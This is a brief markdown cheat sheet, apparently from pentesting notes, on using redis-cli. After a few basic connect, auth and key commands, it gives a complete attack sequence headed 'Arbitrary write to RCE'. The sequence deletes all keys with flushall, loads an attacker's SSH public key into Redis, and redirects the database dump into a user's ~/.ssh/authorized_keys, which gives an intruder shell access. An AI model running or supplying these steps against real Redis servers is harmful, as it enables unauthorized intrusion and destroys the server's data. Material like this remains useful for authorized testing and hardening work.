---
title: "Redis"
date: 2024-7-6
tags: ["redis", "redis-cli", "privesc"]
---

---
### Basic

<div>

```bash
# Connect
redis-cli -h 127.0.0.1
```

```bash
# Provide password
auth <PASSWORD>
```

```bash
# List current keys
keys *
```

```bash
# Add key
incr key
```

```bash
# Get key value
get key
```

<div>

<br>

---

### Abuse #1: Arbitrary write to RCE

<div>

```bash
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt
```

```bash
# Deletes all keys from all databases on current host
redis-cli -h 127.0.0.1 flushall
```

```bash
cat foo.txt | redis-cli -h 127.0.0.1 -x set crackit
```

```bash
redis-cli -h 127.0.0.1 config set dir /home/<USER>/.ssh/
```

```bash
redis-cli -h 127.0.0.1 config set dbfilename "authorized_keys"
```

```bash
redis-cli -h 127.0.0.1 save
```

</div>

<br>
